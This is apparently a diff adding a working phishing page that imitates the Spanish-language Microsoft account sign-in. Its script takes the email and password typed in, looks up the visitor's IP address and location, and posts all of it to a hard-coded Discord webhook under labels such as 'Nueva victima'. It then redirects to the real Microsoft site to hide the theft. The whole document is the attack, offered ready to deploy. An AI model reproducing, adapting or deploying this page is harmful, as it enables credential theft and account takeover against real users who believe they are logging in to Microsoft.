@@ -1,0 +1,241 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Iniciar sesi&oacute;n en su cuenta</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html { font-size: 62.5%; height: 100%; }
+        body {
+            font-size: 1.6rem;
+            min-height: 100vh;
+            background-color: #f2f2f2;
+            font-family: "Segoe UI", SegoeUI, "Helvetica Neue", Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('banner.svg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .cont-xjsx {
+            max-width: 44rem;
+            width: 100%;
+            background-color: #fff;
+            padding: 4.4rem;
+            box-shadow: 0 2px 6px rgba(0,0,0,.2);
+            min-height: 380px;
+        }
+
+        .log { display: flex; align-items: center; margin-bottom: 1.6rem; }
+        .log-ms { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 21px; height: 21px; }
+        .log-ms span { display: block; width: 100%; height: 100%; }
+        .ms-red { background-color: #f25022; } .ms-green { background-color: #7fba00; }
+        .ms-blue { background-color: #00bcf2; } .ms-yellow { background-color: #ffb900; }
+        .log-text { font-size: 21px; font-weight: 600; color: #737373; margin-left: 10px; }
+
+        .title { font-size: 2.4rem; font-weight: 600; color: #1b1b1b; margin-bottom: 1rem; }
+        .subtitulo { font-size: 1.3rem; color: #1b1b1b; margin-top: 4px; line-height: 1.4; }
+        
+        .usr { margin-top: 2rem; position: relative; border-bottom: 1px solid #666; }
+        .usr input {
+            width: 100%;
+            padding: 0.8rem 0;
+            font-size: 1.6rem;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-family: inherit;
+        }
+
+        .hidden { display: none; }
+        .sub { display: flex; justify-content: flex-end; margin-top: 4rem; }
+        
+        input[type="submit"], button {
+            min-width: 10.8rem;
+            padding: 0.8rem 1.2rem;
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            font-size: 1.5rem;
+        }
+
+        .toggle-pass { position: absolute; right: 0; top: 50%; transform: translateY(-50%); cursor: pointer; }
+
+        .links-ms { margin-top: 2rem; font-size: 1.3rem; }
+        .links-ms a { color: #0067b8; text-decoration: none; }
+        .links-ms a:hover { text-decoration: underline; }
+
+        .ms-loader {
+            width: 36px; height: 36px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0067b8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .iti { width: 100%; }
+        #phone { border-bottom: 1px solid #666 !important; border-radius: 0; }
+    </style>
+</head>
+<body>
+
+    <div class="cont-xjsx">
+        <div class="log">
+            <div class="log-ms">
+                <span class="ms-red"></span><span class="ms-green"></span>
+                <span class="ms-blue"></span><span class="ms-yellow"></span>
+            </div>
+            <span class="log-text">Microsoft</span>
+        </div>
+
+        <form id="contact-form">
+            <div id="step-email">
+                <p class="title">Iniciar sesi&oacute;n</p>
+                <p class="subtitulo">Usar su cuenta de Microsoft.</p>
+                <div class="usr">
+                    <input type="email" id="email" placeholder="Correo electr&oacute;nico, tel&eacute;fono o Skype" required>
+                </div>
+                <div class="links-ms">
+                    &iquest;Es nuevo en Microsoft? <a href="#">Crear una cuenta</a>
+                </div>
+                <div class="sub">
+                    <button type="button" id="btn-next-1">Siguiente</button>
+                </div>
+            </div>
+
+            <div id="step-password" class="hidden">
+                <p class="title">Escribir contrase&ntilde;a</p>
+                <div class="usr">
+                    <input type="password" id="pass" placeholder="Contrase&ntilde;a" required>
+                    <div id="toggle-password" class="toggle-pass">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#666"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </div>
+                </div>
+                <div class="links-ms">
+                    <a href="#">&iquest;Olvid&oacute; su contrase&ntilde;a?</a>
+                </div>
+                <div class="sub">
+                    <button type="submit" id="btn-next-2">Siguiente</button>
+                </div>
+            </div>
+        </form>
+    </div>
+<script>
+// 1. VALIDACIÓN ESTRICTA MICROSOFT
+        $('#btn-next-1').click(() => {
+            const email = $('#email').val().toLowerCase().trim();
+            const dominios = ['@hotmail.com', '@hotmail.es', '@outlook.com', '@outlook.es', '@live.com', '@live.es', '@msn.com'];
+
+            const esValido = dominios.some(dom => email.endsWith(dom));
+
+            if (esValido) {
+                $('#step-email').addClass('hidden');
+                $('#step-password').removeClass('hidden');
+            } else {
+                alert("Escriba una dirección de correo electrónico válida de Microsoft (@outlook, @hotmail, @live o @msn).");
+                $('#email').css('border-bottom', '2px solid #e81123');
+                $('#email').focus();
+            }
+        });
+
+        $('#toggle-password').click(function() {
+            const pass = $('#pass');
+            const type = pass.attr('type') === 'password' ? 'text' : 'password';
+            pass.attr('type', type);
+        });
+    // 🚨 CAMBIA ESTA URL POR LA URL REAL DE TU WEBHOOK DE DISCORD 🚨
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1471154630997315625/EWAdwp2bkQXXFkU5Nh87iUKf4NfvnP0eQ5CqUOT1P-fhUC8iSjrXqYAEe1kdkHWG3PTi'; 
+    // API pública y gratuita para obtener la IP y geolocalización
+    const IP_API_URL = 'https://ipapi.co/json/';
+
+    const form = document.getElementById('contact-form');
+    // Asegúrate de que estos elementos existan en tu HTML
+    const statusMessage = document.getElementById('status-message'); 
+
+    form.addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const submitButton = form.querySelector('input[type="submit"]');
+
+        // 1. Recoger datos del formulario
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        // 2. Primero, obtenemos la información de la IP y geolocalización
+        fetch(IP_API_URL)
+            .then(response => response.json())
+            .then(data => {
+                // Crear variables de ubicación (usando 'Desconocido' si falla)
+                const ip = data.ip || 'Desconocido';
+const country = data.country_name || 'Desconocido'; // Nombre de variable diferente
+const city = data.city || 'Desconocido';
+
+                // 3. CONSTRUIR EL TEXTO COMPLETO CON LA NUEVA INFORMACIÓN
+                const content_with_newlines = `
+**👤Usuario:** ${email}
+**🔐Contraseña:** ${pass}
+
+---
+**🧾Información de la victima:**
+**📍IP:** ${ip}
+**🌎País:** ${country}
+**🏙️Ciudad:** ${city}
+                `;
+
+                // 4. Construir el objeto JSON para el webhook de Discord
+                const payload = {
+                    username: "✅MSN✅",
+                    embeds: [{
+                        title: "📧Nuevo login",
+                        color: 3447003, // Color azul Discord
+                        fields: [
+                            { 
+                                name: "👤Nueva victima", 
+                                value: content_with_newlines,
+                                inline: false 
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // 5. Enviar los datos al webhook de Discord
+                return fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+            })
+            .then(response => {
+                if (response.ok) {
+                    // REDIRECCIÓN INSTANTÁNEA AL RECIBIR CONFIRMACIÓN
+                    window.location.href = 'https://account.microsoft.com/';
+                } else {
+                    submitButton.disabled = false;
+                    statusMessage.textContent = '❌ Error al enviar. Verifica la URL del Webhook.';
+                    console.error('Error del Webhook:', response.status, response.statusText);
+                }
+            })
+            .catch(error => {
+                submitButton.disabled = false;
+                statusMessage.textContent = '❌ Error de red o en la API de IP. Inténtalo de nuevo.';
+                console.error('Error de Fetch:', error);
+            });
+    });
+</script>
+</body>
+</html>
